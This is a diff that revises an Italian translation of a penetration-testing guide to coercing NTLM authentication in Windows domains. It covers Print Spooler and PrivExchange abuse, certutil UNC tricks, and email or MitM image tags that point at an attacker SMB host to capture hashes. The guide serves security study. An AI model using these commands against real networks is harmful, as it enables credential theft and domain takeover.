@@ -8,8 +8,8 @@
 
 ## Abuso del servizio Spooler
 
-Se il servizio _**Print Spooler**_ è **abilitato**, puoi utilizzare alcune credenziali AD già conosciute per **richiedere** al server di stampa del Domain Controller un **aggiornamento** sui nuovi lavori di stampa e semplicemente dirgli di **inviare la notifica a un sistema**.\
-Nota che quando la stampante invia la notifica a sistemi arbitrari, deve **autenticarsi** contro quel **sistema**. Pertanto, un attaccante può far sì che il servizio _**Print Spooler**_ si autentichi contro un sistema arbitrario, e il servizio utilizzerà **l'account del computer** in questa autenticazione.
+Se il servizio _**Print Spooler**_ è **abilitato**, puoi utilizzare alcune credenziali AD già note per **richiedere** al server di stampa del Domain Controller un **aggiornamento** sui nuovi lavori di stampa e semplicemente dirgli di **inviare la notifica a un sistema**.\
+Nota che quando la stampante invia la notifica a sistemi arbitrari, deve **autenticarsi** contro quel **sistema**. Pertanto, un attaccante può far sì che il servizio _**Print Spooler**_ si autentichi contro un sistema arbitrario, e il servizio **utilizzerà l'account del computer** in questa autenticazione.
 
 ### Trovare server Windows nel dominio
 
@@ -19,7 +19,7 @@ Get-ADComputer -Filter {(OperatingSystem -like "*windows*server*") -and (Operati
 ```
 ### Trovare i servizi Spooler in ascolto
 
-Utilizzando un @mysmartlogin's (Vincent Le Toux's) [SpoolerScanner](https://github.com/NotMedic/NetNTLMtoSilverTicket) leggermente modificato, verifica se il Servizio Spooler è in ascolto:
+Utilizzando una versione leggermente modificata di @mysmartlogin's (Vincent Le Toux's) [SpoolerScanner](https://github.com/NotMedic/NetNTLMtoSilverTicket), verifica se il Servizio Spooler è in ascolto:
 ```bash
 . .\Get-SpoolStatus.ps1
 ForEach ($server in Get-Content servers.txt) {Get-SpoolStatus $server}
@@ -30,7 +30,7 @@ rpcdump.py DOMAIN/USER:PASSWORD@SERVER.DOMAIN.COM | grep MS-RPRN
 ```
 ### Chiedi al servizio di autenticarsi contro un host arbitrario
 
-Puoi compilare[ **SpoolSample da qui**](https://github.com/NotMedic/NetNTLMtoSilverTicket)**.**
+Puoi compilare [**SpoolSample da qui**](https://github.com/NotMedic/NetNTLMtoSilverTicket)**.**
 ```bash
 SpoolSample.exe <TARGET> <RESPONDERIP>
 ```
@@ -53,7 +53,7 @@ https://github.com/p0dalirius/Coercer
 
 L'attacco `PrivExchange` è il risultato di un difetto trovato nella **funzione `PushSubscription` di Exchange Server**. Questa funzione consente al server Exchange di essere forzato da qualsiasi utente di dominio con una casella di posta ad autenticarsi su qualsiasi host fornito dal client tramite HTTP.
 
-Per impostazione predefinita, il **servizio Exchange viene eseguito come SYSTEM** e ha privilegi eccessivi (specificamente, ha **privilegi WriteDacl sull'aggiornamento cumulativo del dominio pre-2019**). Questo difetto può essere sfruttato per abilitare il **inoltro di informazioni a LDAP e successivamente estrarre il database NTDS del dominio**. Nei casi in cui l'inoltro a LDAP non sia possibile, questo difetto può comunque essere utilizzato per inoltrare e autenticarsi su altri host all'interno del dominio. Lo sfruttamento riuscito di questo attacco concede accesso immediato all'Amministratore di Dominio con qualsiasi account utente di dominio autenticato.
+Per impostazione predefinita, il **servizio Exchange viene eseguito come SYSTEM** e ha privilegi eccessivi (specificamente, ha **privilegi WriteDacl sull'aggiornamento cumulativo del dominio pre-2019**). Questo difetto può essere sfruttato per abilitare il **rilascio di informazioni a LDAP e successivamente estrarre il database NTDS del dominio**. Nei casi in cui il rilascio a LDAP non sia possibile, questo difetto può comunque essere utilizzato per rilasciare e autenticarsi su altri host all'interno del dominio. Lo sfruttamento riuscito di questo attacco concede accesso immediato all'Amministratore di Dominio con qualsiasi account utente di dominio autenticato.
 
 ## All'interno di Windows
 
@@ -90,7 +90,7 @@ certutil.exe -syncwithWU  \\127.0.0.1\share
 
 ### Via email
 
-Se conosci l'**indirizzo email** dell'utente che accede a una macchina che vuoi compromettere, puoi semplicemente inviargli un **email con un'immagine 1x1** come
+Se conosci l'**indirizzo email** dell'utente che accede a una macchina che vuoi compromettere, puoi semplicemente inviargli un'**email con un'immagine 1x1** come
 ```html
 <img src="\\10.10.17.231\test.ico" height="1" width="1" />
 ```
@@ -102,9 +102,15 @@ Se puoi eseguire un attacco MitM a un computer e iniettare HTML in una pagina ch
 ```html
 <img src="\\10.10.17.231\test.ico" height="1" width="1" />
 ```
+## Altri modi per forzare e phishing dell'autenticazione NTLM
+
+{{#ref}}
+../ntlm/places-to-steal-ntlm-creds.md
+{{#endref}}
+
 ## Cracking NTLMv1
 
-Se riesci a catturare [NTLMv1 challenges leggi qui come crackerli](../ntlm/index.html#ntlmv1-attack).\
+Se riesci a catturare [le sfide NTLMv1 leggi qui come crackerle](../ntlm/index.html#ntlmv1-attack).\
 _Ricorda che per crackare NTLMv1 devi impostare la sfida di Responder su "1122334455667788"_
 
 {{#include ../../banners/hacktricks-training.md}}
